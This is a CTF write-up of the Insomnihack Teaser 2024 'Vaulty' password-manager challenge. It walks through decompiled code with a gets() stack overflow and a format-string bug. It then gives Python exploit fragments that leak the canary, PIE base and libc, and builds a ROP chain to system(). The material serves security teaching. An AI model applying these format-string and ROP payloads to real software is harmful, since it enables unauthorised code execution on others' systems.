# Insomnihack Teaser 2024 WriteUp: Vaulty

Vaulty was one of the easier pwn-Challenges in this CTF. It is a password manager, in which you can store a URL, username, and a password. This information can later be viewed by specifying the entry's index.

`checksec` reports Partial RELRO, a Stack Canary, NX, and PIE.

## I came; I saw; I decompiled
Since no source code was provided for the challenge, I started off by throwing IDA at it so see what's happening.

Note that I added the symbol names, including the function names for functions other than `main`:
```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char passwordStore[979]; // [rsp+10h] [rbp-3E0h] BYREF
  char input[5]; // [rsp+3E3h] [rbp-Dh] BYREF
  unsigned __int64 v6; // [rsp+3E8h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  sub_11C9(passwordStore);
  while ( 1 )
  {
    sub_1824();
    fgets(input, 5, stdin);
    switch ( atoi(input) )
    {
      case 1:
        createEntry(passwordStore);
        break;
      case 2:
        modifyEntry(passwordStore);
        break;
      case 3:
        deleteEntry(passwordStore);
        break;
      case 4:
        printEntry(passwordStore);
        break;
      case 5:
        return 0LL;
      default:
        puts("Invalid choice. Please enter a valid option.");
        break;
    }
  }
}
```
While there is no bug here, we can already see that our passwords are thrown onto a stack buffer. Onto `createEntry`:


```c
__int64 __fastcall createEntry(__int64 passwordStore)
{
  [...]

  v14[5] = __readfsqword(0x28u);
  if ( *(int *)(passwordStore + 960) <= 9 )
  {
    fflush(stdin);
    puts("Creating a new entry:");
    puts("Username: ");
    fgets(s, 32, stdin);
    puts("Password: ");
    fgets((char *)v13, 32, stdin);
    puts("URL: ");
    gets(v14, 32LL, stdin);                     // :eyes:
    v2 = (_QWORD *)(passwordStore + 96LL * *(int *)(passwordStore + 960));
    v3 = v10;
    *v2 = *(_QWORD *)s;
    v2[1] = v3;
    v4 = v12;
    v2[2] = v11;
    v2[3] = v4;
    v5 = v13[1];
    v2[4] = v13[0];
    v2[5] = v5;
    v6 = v13[3];
    v2[6] = v13[2];
    v2[7] = v6;
    v7 = v14[1];
    v2[8] = v14[0];
    v2[9] = v7;
    v8 = v14[3];
    v2[10] = v14[2];
    v2[11] = v8;
    ++*(_DWORD *)(passwordStore + 960);
    puts("Entry created successfully.");
  }
  else
  {
    puts("Vault is full. Cannot create more entries.");
  }
  return 0LL;
}
```
At this point, I was really hoping that the bug was not in the lower part of this function, because this looks awful.
Anyway, this function contains our first bug: A good'old `gets` is used to get the URL from the user.
This is not going to be enough though, since we have a stack canary, and have no way to bypass ASLR/PIE yet.
This will change in `printEntry` though:

```c
unsigned __int64 __fastcall printEntry(__int64 a1)
{
  int index; // [rsp+14h] [rbp-1Ch]
  char *format; // [rsp+18h] [rbp-18h]
  char s[5]; // [rsp+23h] [rbp-Dh] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  printf("Select an entry to view (0-%d):\n", (unsigned int)(*(_DWORD *)(a1 + 960) - 1));
  fgets(s, 5, stdin);
  index = atoi(s);
  if ( index >= 0 && index < *(_DWORD *)(a1 + 960) )
  {
    format = (char *)(a1 + 96LL * index);
    printf("Username: ");
    printf(format);               // <- Format String injection
    printf("Password: ");
    printf(format + 32);          // <- Format String injection
    printf("Url: ");
    printf(format + 64);          // <- Format String injection
    putchar(10);
  }
  else
  {
    puts("Invalid entry number.");
  }
  return v5 - __readfsqword(0x28u);
}
```
Here, we directly use the user-provided input as the first argument to printf: A Format-String Injection!
These two vulnerabilities will be enough for us to pwn this challenge.

# Onto the exploit
I started off by writing wrapper functions for creating and viewing entries:
```python
def createEntry(username, password, url):
    recv_until("Vault Menu:")
    send("1\n") # create entry

    recv_until("Username")
    send(username)

    recv_until("Password")
    send(password)

    recv_until("URL")
    send(url)

def printEntry(index):
    recv_until("Vault Menu:")
    send("4\n") # print entry

    recv_until("Select an entry")
    send(f"{index}\n")

    recv_until("Username: ")
    username = recv_until("Password: ")
    username = username[:len(username) - len("Password: ")]

    password = recv_until("\n")

    recv_until("Url: ")
    url = recv_until("\n")
    return (username, password, url)
``` 

First, I leaked the stack canary and `printEntry`'s return address by reading quadwords from the respective offset on the stack:
```python
createEntry(f"%{stack_canary_index}$llx\n", f"%{ret_addr_index}$llx\n", f"1337\n")
(stack_canary, ret_addr, _) = printEntry(0)
```

That way, PIE was already broken.

Onto the libc: For that, I placed a got address into the stack, and dereferenced it:
```python
createEntry(p64(got_puts) + b"\n", f"%{got_addr_index}$s\n", "1337\n")
```

And now, I have everything I need to write that ROP-chain: `pop rdi; ret`, `ret` (for correct stack alignment), and `system`. Profit!